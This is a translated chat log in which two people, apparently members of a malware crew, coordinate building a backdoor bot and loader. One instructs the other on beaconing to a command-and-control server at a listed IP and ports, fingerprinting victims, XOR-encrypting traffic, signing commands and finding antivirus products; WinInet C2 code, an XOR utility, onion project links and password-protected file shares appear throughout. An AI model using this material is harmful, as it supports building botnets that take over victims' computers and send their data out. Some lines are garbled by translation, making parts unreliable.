2020-07-13T12:25:33 mushroom -> price
How's it going?

2020-07-13T13:39:37 price -> mushroom
I'm joining the thread

2020-07-13T13:40:07 price -> mushroom
I'll let you know tomorrow

2020-07-13T13:40:20 mushroom -> price
OK.

2020-07-13T13:41:53 price -> mushroom
 I've had github.com crashing all day, or it's not the same without a search

2020-07-13T13:42:17 price -> mushroom
come across any of these?

2020-07-13T13:45:15 mushroom -> price
It happened when they tried to block Telegram and a bunch of subnets along the way.

2020-07-13T13:46:07 price -> mushroom
I suffered all day with this, now before I asked you, I checked and it works.

2020-07-13T13:46:22 price -> mushroom
But this is really the first time I've ever seen

2020-07-13T13:46:25 price -> mushroom
takoche

2020-07-13T13:47:31 price -> mushroom
have you done all sorts of tricks of the VM and debug? I'm just asking for now, I'll do the functionality first

2020-07-13T13:48:04 price -> mushroom
Or is it not critical at all?

2020-07-13T13:48:19 mushroom -> price
No. I haven't. Not critical yet.

2020-07-13T13:48:28 price -> mushroom
ok

2020-07-14T14:02:30 PM mushroom -> price
Hi. Started doing what? From what date are you going to do?

2020-07-14T14:02:52 price -> mushroom
Even if it's today.

2020-07-14T14:03:07 price -> mushroom
But before you do, you need to clarify the issues

2020-07-14T14:03:09 price -> mushroom
and there are a lot of them.

2020-07-14T14:03:40 price -> mushroom
I already talked to Booza today, he told me about the emmercoins

2020-07-14T14:04:03 price -> mushroom
please tell me about those addresses they gave me

2020-07-14T14:04:15 price -> mushroom
I went to one, it's called a botnet

2020-07-14T14:04:28 price -> mushroom
What can you do there?

2020-07-14T14:04:35 mushroom -> price
What are the addresses?

2020-07-14T14:05:27 price -> mushroom
 https://51.89.125.28:12280

2020-07-14T14:05:47 price -> mushroom
test server where you will test the work

2020-07-14T14:05:51 mushroom -> price
This is the server that commands your bot.

2020-07-14T14:05:57 price -> mushroom
The address to connect in the program for the backdoor http://51.89.125.28:12232

2020-07-14T14:06:08 price -> mushroom
 For the loader http://51.89.125.28:12234

2020-07-14T14:06:12 mushroom -> price
You will use it to give commands to your program.

2020-07-14T14:06:56 price -> mushroom
I went to it, there is a set of addresses, with the extension of the bazaar

2020-07-14T14:06:59 mushroom -> price
http://51.89.125.28:12232 server address for the bot, http://51.89.125.28:12234 for the loader.

2020-07-14T14:07:33 mushroom -> price
This is for programs, you will send requests to these addresses in programs.

2020-07-14T14:08:39 mushroom -> price
You don't need bazaar yet, use these addresses. When you make something that works with these addresses, then you can attach bazaar addresses.

2020-07-14T14:09:02 price -> mushroom
That is to send to the address of the bot, and receive from another address?

2020-07-14T14:09:19 price -> mushroom
it's not clear to me yet

2020-07-14T14:09:32 price -> mushroom
I thought you had to put the program somewhere and run it

2020-07-14T14:10:04 mushroom -> price
No need to post the program yet.

2020-07-14T14:10:41 price -> mushroom
then how do you "use these addresses."

2020-07-14T14:11:02 price -> mushroom
do you have to give them a connection?

2020-07-14T14:11:21 mushroom -> price
The program bot connects to the address for the bot, sends a request as in the TOR said to the address of the bot, gets the command in response, executes, sends the result to the address of the bot. All via http protocol.

2020-07-14T14:11:40 mushroom -> price
See how Wininet works.

2020-07-14T14:11:43 price -> mushroom
and that's all from my computer, so far

2020-07-14T14:11:58 price -> mushroom
I looked it up, and it worked already

2020-07-14T14:12:08 mushroom -> price
Yes. You can from a virtual machine. Whatever is convenient.

2020-07-14T14:13:09 mushroom -> price
Do all this for command 1 (get system information).

2020-07-14T14:13:26 mushroom -> price
From start to finish.

2020-07-14T14:14:07 mushroom -> price
Give your bot commands on the test server.

2020-07-14T14:14:41 mushroom -> price
bots tab

2020-07-14T14:14:43 price -> mushroom
Is there like a command line in there? I looked for it and didn't notice anything.

2020-07-14T14:15:39 mushroom -> price
Once you do as in the TK request commands, there your bot will appear in the list. And you will be able to give him commands.

2020-07-14T14:15:52 mushroom -> price
It's kind of like a GUI.

2020-07-14T14:19:05 price -> mushroom
like an export (with the arrow in the right corner)?

2020-07-14T14:19:24 mushroom -> price
Yes.

2020-07-14T14:19:26 price -> mushroom
Then the html appears in the notepad and can it be corrected as needed?

2020-07-14T14:20:09 mushroom -> price
You don't have to do anything there at all. Your bot isn't there yet.

2020-07-14T14:20:19 price -> mushroom
me for the future

2020-07-14T14:20:38 price -> mushroom
now it's clear where to go and he'll be there in no time

2020-07-14T14:21:12 mushroom -> price
For the future, your bot will be listed and on the right will be a button to go to the tab where you can give him commands.

2020-07-14T14:21:35 price -> mushroom
ok

2020-07-14T14:22:17 mushroom -> price
Did booza make you a redmine account and project to write labor costs and what you're doing there?

2020-07-14T14:22:39 price -> mushroom
I don't think so - he didn't tell me.

2020-07-14T14:24:05 mushroom -> price
I tell him. Start doing it. Then they'll make you a Gitlab account for your projects.

2020-07-14T14:24:26 price -> mushroom
I have everything there.

2020-07-14T14:24:39 price -> mushroom
I did

2020-07-14T14:25:08 mushroom -> price
Is there already one on Gitlab? Which .onion

2020-07-14T14:25:19 price -> mushroom
yes

2020-07-14T14:26:29 price -> mushroom
(offtopic) I prepared instructions for integrating gitlab into the studio, if interested, I can send

2020-07-14T14:29:02 mushroom -> price
Send.
For the bot then do as I wrote above. Execute command 1, you say. Commit to Gitlab, I'll tell you the names for the projects.

2020-07-14T14:29:40 price -> mushroom
ok

2020-07-14T14:34:58 mushroom -> price
Avoid using the standard library. If there is an analogue in WinApi function, use it. For example instead of memcpy CopyMemory, instead of alloc HeapAlloc, instead of free HeapFree, etc.

2020-07-14T14:35:26 price -> mushroom
ok

2020-07-15T14:47:42 mushroom -> price
You haven't started yet? Do you have any other projects?

2020-07-15T14:48:15 price -> mushroom
started making

2020-07-15T14:48:22 price -> mushroom
there are projects in completion

2020-07-15T14:48:38 price -> mushroom
But I don't have a signature on the line

2020-07-15T14:48:52 price -> mushroom
I debugged it for two hours today without success

2020-07-15T14:49:22 mushroom -> price
Which one?

2020-07-15T14:49:26 price -> mushroom
says import error

2020-07-15T14:50:06 price -> mushroom
can't open the file, but when I do a simpler directory in c:\ it opens

2020-07-15T14:50:41 price -> mushroom
But then it still can't sign - it crashes on the signature itself

2020-07-15T14:51:00 mushroom -> price
What program?

2020-07-15T14:51:28 mushroom -> price
Which one are you talking about?

2020-07-15T14:51:48 price -> mushroom
cryptosign.sln

2020-07-15T14:52:44 mushroom -> price
Why are you debugging it. You don't need it. You need to take the signature verification code from it and paste it into the loader and bot.

2020-07-15T14:52:49 price -> mushroom
it does both keys, but then it fails on the line signature

2020-07-15T14:53:09 price -> mushroom
I don't debug, it just doesn't sign.

2020-07-15T14:53:31 mushroom -> price
And you don't have to do the keys. I'll give you a key.

2020-07-15T14:53:53 price -> mushroom
Why did you send the program then?

2020-07-15T14:54:02 price -> mushroom
give me the key

2020-07-15T14:54:30 mushroom -> price
So you take the code from it.

2020-07-15T14:54:42 price -> mushroom
that's not how the code works

2020-07-15T14:54:42 price -> mushroom
that's not how the code works

2020-07-15T14:54:54 price -> mushroom
Or what do you need to take works?

2020-07-15T14:55:42 price -> mushroom
just the encryption doesn't work

2020-07-15T14:57:12 mushroom -> price
It works.

2020-07-15T14:57:24 mushroom -> price
cryptosign.exe --gen pub.key priv.key

2020-07-15T14:57:32 mushroom -> price
cryptosign.exe --sign HELLO --bin priv.key

2020-07-15T14:58:07
cryptosign.exe --verify HELLO pub.key <what the previous command outputs>

2020-07-15T14:58:13 mushroom -> price
Everything works.

2020-07-15T14:58:30 mushroom -> price
Signed the line HELLO and checked.

2020-07-15T14:58:33 price -> mushroom
    if (!crypter.importKey(keyBlob, keyBlobSize, isPrivate))
    {
        cout << "Import key error" << endl;
        HeapFree(GetProcessHeap(), 0, keyBlob);
        return false;
    }

2020-07-15T14:58:58 price -> mushroom
crypter.importKey crashes out

2020-07-15T14:59:34 price -> mushroom
--sign "Signed text!!!" --base64 c:\mysign\private.key

2020-07-15T14:59:40 price -> mushroom
here are the parameters

2020-07-15T15:00:02 price -> mushroom
if not close to the root, it crashes - does not see the file

2020-07-15T15:00:10 mushroom -> price
Did you make the key base64?

2020-07-15T15:00:40 mushroom -> price
By default, the keys are done as --bin.

2020-07-15T15:00:55 price -> mushroom
Most likely, I don't remember exactly now, but I took it from the example

2020-07-15T15:01:22 mushroom -> price
Do what I wrote above.

2020-07-15T15:01:32 price -> mushroom
That is not 64

2020-07-15T15:01:39 price -> mushroom
ok

2020-07-15T15:01:56 mushroom -> price
To base64 you need to specify the --base64 parameter

2020-07-15T15:02:13 mushroom -> price
-gen --base64 for example

2020-07-15T15:02:38 price -> mushroom
I have everything in baht, and there - cryptosign --gen --base64 private.key public.key

2020-07-15T15:02:41 mushroom -> price
That's why it can not import, the format is not specified correctly.

2020-07-15T15:03:07 price -> mushroom
That's why I don't remember.

2020-07-15T15:03:31 price -> mushroom
I'm going to redo it like yours.

2020-07-15T15:04:11 price -> mushroom
I also have the public and private keys written in reverse

2020-07-15T15:04:24 PM price -> mushroom
compared to you

2020-07-15T15:05:01 mushroom -> price
With base64:
cryptosign.exe --gen --base64 pub.key priv.key
cryptosign.exe ---sign HELLO --base64 priv.key
cryptosign.exe --verify HELLO --base64 pub.key <signature>

2020-07-15T15:05:12 mushroom -> price
I've done it now, it all works.

2020-07-15T15:05:29 price -> mushroom
the only difference is the order, maybe that's the problem

2020-07-15T15:05:55 mushroom -> price
Generated keys, signed, verified the signature.

2020-07-15T15:06:02 mushroom -> price
What's your order?

2020-07-15T15:06:10 price -> mushroom
as in the manual

2020-07-15T15:06:12 price -> mushroom
cryptosign --gen --base64 private.key public.key

2020-07-15T15:06:23 mushroom -> price
And then?

2020-07-15T15:06:38 price -> mushroom
cryptosign --sign "Signed text!!!" --base64 private.key

2020-07-15T15:06:49 mushroom -> price
And then?

2020-07-15T15:07:01 price -> mushroom
I can't go any further.

2020-07-15T15:07:14 price -> mushroom

cryptosign --verify "Signed text!!!" --base64 public.key JngHfHcgGcswWP0ZWeaEvzNVLozMbWYtg9EssMD7JdhiLKYg6A50+7cuPSUDs4opnwEPnN1MjPLaQZ8r9mm9V71EhmYkAucTxENmY6X7CTBibsszgUVuxjXBrHKlNT

2020-07-15T15:07:30 PM mushroom -> price
This is the signature

2020-07-15T15:07:32 mushroom -> price
JngHfHcgGcswWP0ZWeaEvzNVLozMbWYtg9EssMD7JdhiLKYg6A50+7cuPSUDs4opnwEPnN1MjPLaQZ8r9mmV71heEhmYkAucTxENmY6XCTBibsszgUVuxjXBrHKlNT

2020-07-15T15:07:43 price -> mushroom
By the way, should the keys have CRLF in them or not?

2020-07-15T15:07:57 price -> mushroom
I was going to take the signature from the key

2020-07-15T15:08:05 price -> mushroom
The one I just sent you from the example

2020-07-15T15:08:15 mushroom -> price
Here is the signature: JngHfHcgGcswWP0ZWeaEvzNVLozMbWYtg9EssMD7JdhiLKYg6A50+7cuPSUDs4opnwEPnN1MjPLaQZ8r9mmV71heEhmYkAucTxENmY6X7CTBibsszgUVuxjXBrHKlNT

2020-07-15T15:08:35 mushroom -> price
It is always generated.

2020-07-15T15:09:03 price -> mushroom
I seem to have the same

2020-07-15T15:09:09 mushroom -> price
Do a third command.

2020-07-15T15:09:21 mushroom -> price
With the signature I got on the second command.

2020-07-15T15:09:40 price -> mushroom
Okay, I'm doing it now.

2020-07-15T15:11:05 mushroom -> price
Have you read the README for criptosign?

2020-07-15T15:11:31 price -> mushroom
Sure, that's where I got my examples from.

2020-07-15T15:13:22 mushroom -> price
So what checks the signature?

2020-07-15T15:14:41 mushroom -> price
And how did you want to take the signature from the key?

2020-07-15T15:15:12 mushroom -> price
The key only generates it. And then it checks it.

2020-07-15T15:15:35 mushroom -> price
Private generates, public checks.

2020-07-15T15:16:06 mushroom -> price
The caption here is always in base64 format

2020-07-15T15:16:22 mushroom -> price
And keys can be either base64 or just binary.

2020-07-15T15:17:15 price -> mushroom
here you go

2020-07-15T15:17:16 price -> mushroom
cryptosign --verify "HELLO" --base64 pub.key JxD62J/VzpE55ZOu0G7dPvBhJT2wJsaP8sHt6PuA/ijYQQFsW+0HwraCcCeZ3q3tEk1gN68dWUhs4b4134xaAgb74DtaxM52zrPu5X49t5AVek3ObZlYAFYWYnTNRFOS
Verified

2020-07-15T15:17:25 price -> mushroom
problem solved

2020-07-15T15:17:28 mushroom -> price
It worked.

2020-07-15T15:17:33 price -> mushroom
yes

2020-07-15T15:17:47 price -> mushroom
fake manual

2020-07-15T15:18:52 price -> mushroom
I will not look into the files, although it's strange - my directory is not that deep, and there are no Cyrillic letters.

2020-07-15T15:19:36 price -> mushroom
And I specified the full path

2020-07-15T15:19:54 mushroom -> price
That must have been the wrong format.

2020-07-15T15:20:16 mushroom -> price
Here's a key for you:
Download: https://qaz.im/load/3i6RHF/GQSNkR
Delete: https://qaz.im/index.php?a=delete&q=1180917199
Password: mPJ]u3/Z<4+}S\hG4

2020-07-15T15:20:58 mushroom -> price
You'll write it in your program as an array of bytes. It is in binary format. To check the date signature that will come from the server.

2020-07-15T15:21:01 price -> mushroom
You mean text, but you want a binary? Or vice versa?

2020-07-15T15:21:23 mushroom -> price
Who's textual?

2020-07-15T15:21:45 price -> mushroom
Got the format

2020-07-15T15:22:09 price -> mushroom
But it really dumped the createfile with -1

2020-07-15T15:22:38 mushroom -> price
Maybe it was open somewhere.

2020-07-15T15:22:49 price -> mushroom
I don't think so

2020-07-15T15:22:56 mushroom -> price
You should have looked at GetLastError.

2020-07-15T15:23:03 price -> mushroom
I changed the name, same thing.

2020-07-15T15:23:10 price -> mushroom
That's where I looked.

2020-07-15T15:23:14 price -> mushroom
902 something

2020-07-15T15:23:28 price -> mushroom
it's not in the msdn file

2020-07-15T15:23:47 price -> mushroom
Never mind, let's move on.

2020-07-15T15:24:13 mushroom -> price
Make the command 1 in its entirety.

2020-07-15T15:24:38 mushroom -> price
There is no signature on the test server yet. You don't have to check it yet.

2020-07-15T15:26:14 mushroom -> price
Did I give you an example of encryption?

2020-07-15T15:26:32 mushroom -> price
xor encrypt everything from and to the server.

2020-07-15T15:30:56 price -> mushroom
Did I give you an example of encryption?

2020-07-15T15:30:56 price -> mushroom
xor encrypt everything from and to the server.

2020-07-15T15:36:41 mushroom -> price
[18:26:15] <mushroom> encryption I gave an example?
[18:26:33] <mushroom> xor encrypt everything from and to the server.

2020-07-15T15:39:19 price -> mushroom
gave

2020-07-15T15:39:32 price -> mushroom
SIZE_T Crypter::cryptXor

2020-07-15T15:39:48 mushroom -> price
So it's all there.

2020-07-15T15:40:50 mushroom -> price
Generate id as in TK, query command as in TK, give Get System info command on test server, get, execute, send result to server.

2020-07-15T15:41:34 mushroom -> price
You have a price group.

2020-07-15T15:41:40 price -> mushroom
yes

2020-07-16T09:02:03 price -> mushroom
hi

2020-07-16T09:02:33 price -> mushroom
What about "It is suggested to use md5-hash from the string
"creation_date%windir%.computer_date%windir\system32%.name_domain_or_workgroup""

2020-07-16T09:02:50 price -> mushroom
Is that what cryptXor will give you?

2020-07-16T09:03:15 price -> mushroom
And what is the key for encryption?

2020-07-16T09:03:51 price -> mushroom
well and the rest of everything, date_creation - bot module?

2020-07-16T09:04:36 price -> mushroom
computer_name.creation_date?

2020-07-16T09:04:51 price -> mushroom
windir - c:\windows?

2020-07-16T09:05:07 price -> mushroom
then what is windir\system32?

2020-07-16T09:07:29 mushroom -> price
windir is the system folder, if the system is in C:\Windows, then windir\system32 is C:\Windows\System32

2020-07-16T09:08:39 price -> mushroom
There's a percent sign in the wrong place.

2020-07-16T09:09:12 mushroom -> price
So it's a typo.

2020-07-16T09:09:23 price -> mushroom
%windir%\system32 - this is how it should be, and in the TOR %windir\system32%

2020-07-16T09:09:41 price -> mushroom
now about encryption and creation dates

2020-07-16T09:09:54 mushroom -> price
Typos. The System32 folder can only be in the system folder.

2020-07-16T09:12:04 price -> mushroom
is it encrypted by one byte or by some key string (like private.key?)?

2020-07-16T09:12:33 price -> mushroom
and what are the creation dates there?

2020-07-16T09:13:15 mushroom -> price
The md5-hash of the string will be the id of your bot and simultaneously the key for xor encryption.

2020-07-16T09:13:29 mushroom -> price
Creation dates, this is the creation date of the Windows folder.

2020-07-16T09:13:39 price -> mushroom
Or better example, what should I send to Get, so that the server responds, but it sends an error 404

2020-07-16T09:14:07 price -> mushroom
there are two creation dates, the same one?

2020-07-16T09:15:28 mushroom -> price
md5 hash from a string, it turns out an array of bytes, for xor encryption is suitable, to send to the server is an array of bytes converted into a hex string and send it like this GET /<hex>/2

2020-07-16T09:15:36 price -> mushroom
I guess so, since system32 has the same date

2020-07-16T09:16:35 mushroom -> price
You can twist and put a different date, the main thing that the bot on a particular computer has always been the same id, regardless of the user who launched it.

2020-07-16T09:16:56 mushroom -> price
I have the same date. It's accurate to the millisecond.

2020-07-20T11:37:48 mushroom -> price
Hi Buza said you have an account on redmine. He will give you a project for the loader and bot. You will write there what you do and the effort.

2020-07-20T11:38:07 price -> mushroom
ok

2020-07-20T11:38:10 mushroom -> price
By the way, what are you doing on them?

2020-07-20T11:38:14 price -> mushroom
How to log on to the server

2020-07-20T11:38:18 price -> mushroom
?

2020-07-20T11:38:53 mushroom -> price
Which one?

2020-07-20T11:38:58 price -> mushroom
I gathered all the information about the system, encrypted and unencrypted, but the request comes 404

2020-07-20T11:39:17 price -> mushroom
after that - the road is open

2020-07-20T11:39:29 price -> mushroom
		HINTERNET hConnect =
			InternetConnect(
				hInternet,
				TEXT("51.89.125.28"),//<---- IP
				12232,// <---- port on IP INTERNET_DEFAULT_HTTP_PORT -> INTERNET_PORT nServerPort,
				NULL, NULL,//LPCSTR lpszUserName,LPCSTR lpszPassword,
				INTERNET_SERVICE_HTTP,//DWORD dwService,
				0,//DWORD dwFlags,
				1u//DWORD_PTR dwContext
			);

2020-07-20T11:39:42 price -> mushroom
I open it like this, it's fine.

2020-07-20T11:41:19 price -> mushroom
What should I write here?

2020-07-20T11:41:21 price -> mushroom
			LPCWSTR sget = L "System;
			HINTERNET hRequest =
				HttpOpenRequest(
					hConnect,
					TEXT("GET"),
					sget,
					NULL,
					NULL,
					0,
					INTERNET_FLAG_KEEP_CONNECTION,
					1);

2020-07-20T11:41:27 mushroom -> price
Tell me in steps. How do you do the full cycle of command execution. Starting with how you ask for it.

2020-07-20T11:41:36 price -> mushroom
I don't remember what System has to do with it.

2020-07-20T11:42:17 mushroom -> price
It has nothing to do with anything.

2020-07-20T11:42:41 mushroom -> price
Do you create an id for the bot first?

2020-07-20T11:42:56 mushroom -> price
At the beginning of the program.

2020-07-20T11:43:16 price -> mushroom
InternetOpen -> InternetConnect -> HttpAddRequestHeadersA for cookies->HttpOpenRequest->InternetReadFile

2020-07-20T11:43:44 price -> mushroom
I read everything from the normal site, the problem is where the command will come from to read

2020-07-20T11:43:56 mushroom -> price
All queries must have an id.

2020-07-20T11:44:00 price -> mushroom
Iid create

2020-07-20T11:44:10 mushroom -> price
And cookies with your group.

2020-07-20T11:44:20 price -> mushroom
here's a look at my wininet chain

2020-07-20T11:44:23 mushroom -> price
Show the command request.

2020-07-20T11:44:28 price -> mushroom
What functions should be there

2020-07-20T11:45:49 price -> mushroom
I just prepared the formation of the id, questions on the format of the dates of creation (or does it generally do not matter and they are only for uniqueness?)

2020-07-20T11:46:10 price -> mushroom
the cookie with the group is HttpAddRequestHeadersA

2020-07-20T11:46:29 mushroom -> price
For uniqueness. To make one computer uniquely different from another.

2020-07-20T11:46:33 price -> mushroom
finishes fine, but it is not clear where to mount it

2020-07-20T11:46:44 price -> mushroom
i.e. any format of ID

2020-07-20T11:47:04 price -> mushroom
with proyles without with decoding dates or numbers - it's all the same

2020-07-20T11:47:25 price -> mushroom
Sorry, my wife and kid are leaving for Kamchatka.

2020-07-20T11:47:29 price -> mushroom
I'll put them in a cab.

2020-07-20T11:47:36 mushroom -> price
InternetOpen -> InternetConnect -> httpOpenRequest -> httpSendRequest

2020-07-20T11:47:38 price -> mushroom
I'll contact you later

2020-07-20T11:47:39 mushroom -> price
Go for it.

2020-07-20T15:02:59 price -> mushroom
Hi, still here?

2020-07-20T15:03:24 mushroom -> price
Here.

2020-07-20T15:04:07 price -> mushroom
we have almost identical chains, tell me in which function the real parameters should be set

2020-07-20T15:04:49 PM price -> mushroom
By the way, this is how I wanted to write cookies

2020-07-20T15:04:50 price -> mushroom
		char* lpszHeaders = (char*) "Cookie: group=price";
		DWORD dwHeadersLength = strlen(lpszHeaders);
		HttpAddRequestHeadersA(hInternet, lpszHeaders, dwHeadersLength, HTTP_ADDREQ_FLAG_ADD);

2020-07-20T15:05:17 price -> mushroom
№1

2020-07-20T15:05:19 price -> mushroom
		InternetOpen(
			TEXT("WinInet Communication"),
			INTERNET_OPEN_TYPE_PRECONFIG,
			NULL, NULL,
			0);

2020-07-20T15:05:27 price -> mushroom
it's easy to open

2020-07-20T15:05:40 price -> mushroom
№2

2020-07-20T15:05:42 price -> mushroom
		HINTERNET hConnect =
			InternetConnect(
				hInternet,
				TEXT("51.89.125.28"),//<---- IP
				12232,// <---- port on IP INTERNET_DEFAULT_HTTP_PORT -> INTERNET_PORT nServerPort,
				NULL, NULL,//LPCSTR lpszUserName,LPCSTR lpszPassword,
				INTERNET_SERVICE_HTTP,//DWORD dwService,
				0,//DWORD dwFlags,
				1u//DWORD_PTR dwContext
			);

2020-07-20T15:06:05 price -> mushroom
is this right?

2020-07-20T15:06:42 mushroom -> price
That's right.

2020-07-20T15:06:54 mushroom -> price
This is how I have it:

2020-07-20T15:06:56 mushroom -> price
internetConnect(g_inet, host, port, NULL, NULL,
        INTERNET_SERVICE_HTTP, 0, 0);

2020-07-20T15:07:20 PM price -> mushroom
ok

2020-07-20T15:07:26 mushroom -> price
Then:
HINTERNET req = wininet.httpOpenRequest(connection, method, path, _TSTR(TEXT("1.1")), NULL,
        NULL, (isSecure ? INTERNET_FLAG_SECURE : 0) | INTERNET_FLAG_NO_COOKIES, 0);

2020-07-20T15:07:27 price -> mushroom
Then I put a cookie

2020-07-20T15:07:57 mushroom -> price
Then:
httpSendRequest(req, headers, headersLen, body, bodySize)

2020-07-20T15:08:04 price -> mushroom
I will also try it and put the ID already

2020-07-20T15:08:15 mushroom -> price
The cookies are in headers, headersLen.

2020-07-20T15:08:25 mushroom -> price
Manually write them in the header.

2020-07-20T15:08:32 price -> mushroom
got it

2020-07-20T15:08:43 mushroom -> price
The way you do it now on Windows Server does not work.

2020-07-20T15:09:26 mushroom -> price
method is GET, path is /<id generated>/2

2020-07-20T15:09:39 mushroom -> price
This is a request to get a command from the server.

2020-07-20T15:10:07 price -> mushroom
are the slashes really standing and everything inside is ID?

2020-07-20T15:10:16 mushroom -> price
body, bodySize are empty (NULL and 0).

2020-07-20T15:10:23 PM mushroom -> price
Yes.

2020-07-20T15:10:26 price -> mushroom
ok

2020-07-20T15:11:11 price -> mushroom
Okay, got it, thanks.

2020-07-20T15:11:19 price -> mushroom
here's more

2020-07-20T15:11:51 price -> mushroom
I listed the installed applications, there are 463 of them, how do you transfer them?

2020-07-20T15:13:48 mushroom -> price
It's all in url encoded format. I'll send you a sample info now.

2020-07-20T15:14:07 price -> mushroom
go to

2020-07-20T15:22:48 mushroom -> price
Download: https://qaz.im/load/D2ASba/9zDSYN
Delete: https://qaz.im/index.php?a=delete&q=329620950
Password: D1d+y?&UsOwdAD:1K

2020-07-20T15:23:14 price -> mushroom
thanks

2020-07-20T15:23:17 mushroom -> price
Everything you send to the server must be in utf-8 encoding.

2020-07-20T15:35:36 mushroom -> price
Your project in redmine https://mk6gwg6mwnn6if33.onion/projects/bdspider

2020-07-20T15:36:02 price -> mushroom
ok

2020-07-20T15:36:04 mushroom -> price
Write what you're doing there and the time. Break your project into subtasks yourself.

2020-07-21T15:23:51 mushroom -> price
Hi you have nothing in your project on redmine that says what you did and are doing.

2020-07-21T15:24:36 price -> mushroom
that's what I'm doing, by the way, and the question is

2020-07-21T15:24:49 price -> mushroom
schedule all the work

2020-07-21T15:24:59 price -> mushroom
And how to report every day

2020-07-21T15:25:05 price -> mushroom
?

2020-07-21T15:25:30 mushroom -> price
Write in there every day what you're doing.

2020-07-21T15:25:48 price -> mushroom
how do you find the antivirus? in the registry?

2020-07-21T15:26:26 mushroom -> price
I don't know, I find it differently.

2020-07-21T15:26:31 price -> mushroom
That is, in the evening I look at what needs to be done tomorrow and write this and that, and in the evening I write what I have done?

2020-07-21T15:26:45 price -> mushroom
got it about the AV.

2020-07-21T15:27:47 mushroom -> price
Just create tasks for yourself in the project, put the status in the work, what you're doing, at the end of the day added to this task labor. How much she did.

2020-07-21T15:28:17 price -> mushroom
I will write for tomorrow.

2020-07-23T11:18:10 mushroom -> price
Hi. What have you done so far?

2020-07-23T11:18:32 price -> mushroom
I'm writing you a letter.

2020-07-23T11:18:50 price -> mushroom
Got stuck with getting a response from the server

2020-07-23T11:19:22 price -> mushroom
everything is licked, I don't understand what's wrong (and your example is in front of me)

2020-07-23T11:19:44 price -> mushroom
please run it, it's very simple

2020-07-23T11:20:38 mushroom -> price
I didn't give an example.

2020-07-23T11:21:20 price -> mushroom
gave you how you implemented http operation

2020-07-23T11:21:28 mushroom -> price
No.

2020-07-23T11:21:37 mushroom -> price
Bouza may have given.

2020-07-23T11:21:37 price -> mushroom
[20.07.2020 18:07:57] <mushroom> Then: httpSendRequest(req, headers, headersLen, body, bodySize)
[20.07.2020 18:08:15] <mushroom> Cookies are in headers, headersLen.Manually write them in header.
[20.07.2020 18:08:44] <mushroom> The way you do now on Windows Server doesn't work.
[20.07.2020 18:09:39] <mushroom> This is request to receive command from server.
[20.07.2020 18:10:16] <mushroom> body, bodySize are empty(NULL and 0).

2020-07-23T11:21:56 mushroom -> price
This one is only a query.

2020-07-23T11:22:14 mushroom -> price
Then you read req.

2020-07-23T11:22:17 price -> mushroom
e vtyz rfr hfp Get and it does not go

2020-07-23T11:22:22 mushroom -> price
The answer will be there.

2020-07-23T11:22:31 price -> mushroom
That's exactly what's not working for me.

2020-07-23T11:22:38 price -> mushroom
Or says 404

2020-07-23T11:22:41 price -> mushroom
or 400

2020-07-23T11:23:03 mushroom -> price
Show me the query.

2020-07-23T11:23:12 mushroom -> price
Path, header.

2020-07-23T11:23:25 price -> mushroom
I'll send you a text file

2020-07-23T11:23:26 mushroom -> price
Address, too.

2020-07-23T11:23:41 price -> mushroom
Everything will be there and the ID

2020-07-23T11:23:47 price -> mushroom
and paths

2020-07-23T11:24:12 price -> mushroom
I have explored all options (strange that either 404 or 400 gives out an error)

2020-07-23T11:24:38 price -> mushroom
if flagging about cookies

2020-07-23T11:24:48 price -> mushroom
like yours

2020-07-23T11:25:07 price -> mushroom
If I put a zero, then 404, if but the cookie -400

2020-07-23T11:25:30 price -> mushroom
Save the day.

2020-07-23T11:26:26 mushroom -> price
Give me the file.

2020-07-23T11:26:50 price -> mushroom
Yes, I'm writing it down so that it's clear to you and to me later

2020-07-23T11:28:55 mushroom -> price
Here's an encryption utility\decrypting xor id, like the one on the server.

2020-07-23T11:28:58 mushroom -> price
#include <iostream>
#include <fstream>
#include <string>
#include <memory>

//C++ 17.
//#include <filesystem>

using namespace std;

int main(int argc, char *argv[])
{
    //Check the number of arguments.
    if (argc < 4)
    {
        cout << "Too few arguments. Use first argument for key, second argument for source file,"
            " third argument for destination file" << endl;
        return 1;
    }

    //Check key size and multiplicity 2.
    string hex(argv[1]);
    if (hex.empty() || hex.size() % 2)
    {
        cout << "Wrong key" << endl;
        return 1;
    }

    //Convert key hex representation to byte representation.
    size_t keySize = hex.size() / 2;
    auto key = make_unique<unsigned char[]>(keySize);
    for (size_t i = 0, j = 0; j < keySize; i += 2, ++j)
    {
        char* check = NULL;
        unsigned char byte = static_cast<unsigned char>(strtoul(hex.substr(i, 2).c_str(),
            &check, 16));
        if (*check != '\0')
        {
            cout << "Wrong key at symbol " << *check << endl;
            return 1;
        }

        key[j] = byte;
    }
    cout << "Key size " << keySize << endl;

    //Open source file to read binary data.
    fstream src(argv[2], ios_base::in | ios_base::binary);
    if (!src)
    {
        cout << "Can't open source file " << endl;
        return 1;
    }

    //C++ 17.
    //cout << "Input file size " << filesystem::file_size(argv[2]) << endl;

    src.seekg(0, ios_base::end);
    size_t srcSize = src.tellg();
    cout << "Input file size " << srcSize << endl;
    if (srcSize > 10485760)
    {
        cout << "Input file size is too large!" << endl;
        cout << "Key: " << hex << endl;
        cout << "Input file: " << argv[2] << endl;
        cout << "Output file: " << argv[3] << endl;
        return 1;
    }
    src.seekg(0, ios_base::beg);

    //Open destination file to write binary data (truncated).
    fstream dest(argv[3], ios_base::out | ios_base::binary | ios_base::trunc);
    if (!dest)
    {
        cout << "Can't open destination file" << endl;
        return 1;
    }

    //Crypt/decrypt file.
    cout << "Working..." << endl;
    size_t keyIndex = 0;
    size_t destSize = 0;
    while (!src.eof())
    {
        unsigned char byte = static_cast<unsigned char>(src.get());
        if (!src.eof())
        {
            If (destSize < 10485760)
            {
                dest.put(byte ^ key[keyIndex]);
                ++destSize;
            }
            else
            {
                cout << "Output file size is too large!" << endl;
                cout << "Key: " << hex << endl;
                cout << "Input file: " << argv[2] << endl;
                cout << "Output file: " << argv[3] << endl;
                return 1;
            }
        }

        ++keyIndex;
        if (keyIndex == keySize)
            keyIndex = 0;
    }
    cout << "Output file size " << dest.tellg() << endl;

    src.close();
    dest.close();

    //C++ 17.
    //cout << "Output file size " << filesystem::file_size(argv[3]) << endl;
    cout << "Ready" << endl;

    return 0;
}

2020-07-23T11:29:35 mushroom -> price
To check what you get.

2020-07-23T11:30:04 price -> mushroom
ok

2020-07-23T11:35:15 price -> mushroom
261578874264819908609102035485573088411

2020-07-23T11:35:22 price -> mushroom
password

2020-07-23T11:36:58 price -> mushroom
Download: https://qaz.im/load/YsEkRz/5Rir6A
Delete: https://qaz.im/index.php?a=delete&q=800191228

2020-07-23T11:40:25 mushroom -> price
What is a dechashID

2020-07-23T11:40:28 mushroom -> price
?

